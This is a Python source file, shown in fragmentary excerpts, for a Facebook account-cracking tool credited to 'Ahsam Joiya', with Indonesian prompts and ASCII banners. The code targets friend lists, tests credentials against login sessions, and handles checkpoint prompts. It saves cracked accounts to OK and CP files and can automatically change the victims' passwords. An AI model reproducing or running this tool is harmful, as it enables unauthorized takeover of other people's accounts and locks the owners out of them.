#!/usr/bin/python3
#-*-coding:utf-8-*-
# Made With ❤️ By Ahsam  joiya Project
# Update V1.6
_auth01_ = 'AHSAMJOIYA AUH'

# Author : MR.AUH.JOIYA
# Facebook (AHSAM UL HAQ )   : Facebook.com/AHSAM.JOIYA
# Instagram (☬ AHSAMJOIYA ☬)    : Instagram.com/AHSAMJOIYA.id
# Whatsapp (Dapunta Bot_Key)      : +3411471937
# YouTube (Tricker Ahsamu.ID)           ://youtube.com/channel/UCo8QluEsIV_rV2StJQCAUKw
...
$$ |  $$ |$$ |  $$ |$$\   $$ |$$ |  $$ |$$ |\$  /$$ |
$$ |  $$ |$$ |  $$ |\$$$$$$  |$$ |  $$ |$$ | \_/ $$ |
\__|  \__|\__|  \__| \______/ \__|  \__|\__|     \__|'%(O))
    _logo_line_2_ = ('%s  %s©  %s<  /  ╔═══════════════════════╗'%(O,P,O))
    _logo_line_3_ = ('%s   ║  %sCoded By AHSAM JOIYA  %s║'%(O,P,O))
    _logo_line_4_ = ('%s    %s• AUH TEAM •    %s║'%(O,P,O))
...
def cek_opsi(user,pw,format):
    ...
    if "c_user" in _req_ses_.cookies.get_dict():
        if "Ahsam Anda Dikunci" in _url_post_.text:pass
        ...
        if len(_check_opsi_)==0:
            if "Lihat detail login yang ditampilkan. Ini Anda?" in _title_dev_:
                if _auto_change_pass_ == 'Ya':change_pass(user,_req_ses_,_response_,link_2)
                    ...
                    if cek_pilih_opsi == 'Ya':_dapunta_cici_(format);_dapunta_cici_('   %s• %sAhsam One Tap'%(H,P));_dapunta_cici_("")
                    else:_dapunta_cici_(format);_dapunta_cici_('   %s• %sAhsam One Tap'%(H,P))
            else:pass
...
def auto_ganti_pass(_piye_):
    while True:
        _gimana_ = _cici_dapunta_('%s╠══[%s•%s] %sGanti Pass Ahsam One Tap? [y/t] : '%(O,P,O,P))
...
def teman_target():
    ...
    for id in tt:
        ...
        except KeyError:_dapunta_cici_('╠══[!] AHSAM Ahsam Spam')
    ...
    if ch in ['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
        ...
        try:
            ...
            try:
                ...
                del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "");_dapunta_cici_('\n%s╔══[%s•%s] %sTotal Hasil Crack Tanggal %s Alina %s Ahsam'%(O,P,O,P,del1,len(ppp)))
...
def cek_hasil():
    ...
    print('%s╠══[ %sCek Opsi Ahsam Hasil Crack %s]'%(O,P,O));_dapunta_cici_('%s║'%(O));_dapunta_cici_('%s╠══[%s•%s] %sContoh File : %s.txt'%(O,P,O,P,tanggal));files__ = _cici_dapunta_('%s╠══[%s•%s] %sFile : '%(O,P,O,P));files = "CP/"+files__
    ...
    auto_ganti_pass('Ya');_dapunta_cici_("%s╚══[%s•%s] %sfb king Ahsam : %s"%(O,P,O,P,str(len(buka_baju))));_dapunta_cici_("")
...
def started():
    ...
    _dapunta_cici_('%s╠══[%s•%s] %sAHSAM [OK] Disimpan Ke OK/%s.txt'%(O,P,O,P,tanggal))
    _dapunta_cici_('%s╠══[%s•%s] %sAHSAM [CP] Disimpan Ke CP/%s.txt'%(O,P,O,P,tanggal))
